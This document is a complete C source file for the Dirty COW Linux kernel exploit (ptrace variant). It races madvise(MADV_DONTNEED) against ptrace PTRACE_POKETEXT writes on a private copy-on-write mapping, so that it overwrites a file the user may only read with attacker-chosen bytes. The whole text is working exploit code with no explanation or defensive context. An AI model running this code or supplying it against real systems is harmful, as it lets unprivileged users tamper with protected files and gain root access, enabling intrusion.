#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>

int f;// file descriptor
void *map;// memory map
pid_t pid;// process id
pthread_t pth;// thread
struct stat st;// file info

void *madviseThread(void *arg)
{
  int i,c=0;// counters
  for(i=0;i<200000;i++)
    c+=madvise(map,100,MADV_DONTNEED);// race condition
  printf("madvise %d\n\n",c);// sum of errors
}

int main(int argc,char *argv[]){
  if(argc<3)
    return 1;
  printf("%s %s\n", argv[1], argv[2]);
  f=open(argv[1],O_RDONLY);// open read only file
  fstat(f,&st);// stat the fd
  map=mmap(NULL,
           st.st_size+sizeof(long),// size is filesize plus padding
           PROT_READ,// read-only
           MAP_PRIVATE,// private mapping for cow
           f,// file descriptor
           0);// zero
  printf("mmap %lx\n\n",(unsigned long)map);// sum of error code
  
  pid=fork();// fork process 
  if(pid)
  { 
    waitpid(pid,NULL,0)                    ;// wait for child
    int u,i,o,c=0,l=strlen(argv[2])        ;// util vars (l=length)
    for(i=0;i<100/l;i++)//////////////////// loop to 10K divided by l
      for(o=0;o<l;o++)//////////////////////// repeat for each byte
        for(u=0;u<100;u++)////////////////// try 10K times each time
        {
          int ret =ptrace(PTRACE_POKETEXT  ,// inject into memory
                    pid                    ,// process id
                    map+o                  ,// address
                    *((long*)(argv[2]+o))) ;// value
          c+= ret;
          if(ret)
          {
            perror("ptrace error");
          }
                   
        }            
    printf("ptrace %d\n\n",c);// sum of error code
  }
  else
  {
    pthread_create(&pth,NULL,madviseThread,NULL);// null
    ptrace(PTRACE_TRACEME);
    kill(getpid(),SIGSTOP);// signal parent
    pthread_join(pth,NULL);// wait for thread
  }
  return 0;
}
